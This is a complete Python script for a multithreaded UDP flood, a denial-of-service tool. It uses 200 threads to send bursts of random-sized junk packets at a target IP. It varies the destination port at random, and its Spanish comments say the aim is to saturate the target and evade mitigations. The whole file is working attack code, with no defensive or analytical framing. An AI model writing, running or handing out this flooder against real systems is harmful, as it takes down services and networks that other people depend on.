import socket
import threading
import os
import time
import random

class PowerfulUDPFlood:
    def __init__(self, ip, port, threads, duration, stop_event=None):
        self.ip = ip
        self.port = port
        self.threads = threads
        self.duration = duration
        self.stop_event = stop_event
        self.on = False

    def flood(self):
        self.on = True
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.send, daemon=True)
            t.start()
            threads.append(t)

        end_time = time.time() + self.duration
        try:
            while time.time() < end_time and self.on:
                if self.stop_event and self.stop_event.is_set():
                    break
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            self.on = False

    def send(self):
        while self.on:
            if self.stop_event and self.stop_event.is_set():
                break

            try:
                # Paquete de tamaño aleatorio para evadir mitigaciones
                packet_size = random.choice([1024, 2048, 4096, 8192, 16384])
                data = os.urandom(packet_size)
                
                # Puerto aleatorio en rango (puedes ajustar el rango)
                dest_port = self.port
                if random.random() > 0.7:
                    dest_port = random.randint(1, 65535)

                # Burst: varios paquetes seguidos para saturar
                burst_count = random.randint(10, 100)
                for _ in range(burst_count):
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(data, (self.ip, dest_port))
                    s.close()
            except Exception:
                pass

def run(ip, port, duration, stop_event=None):
    attacker = PowerfulUDPFlood(ip, port, threads=200, duration=duration, stop_event=stop_event)
    attacker.flood()
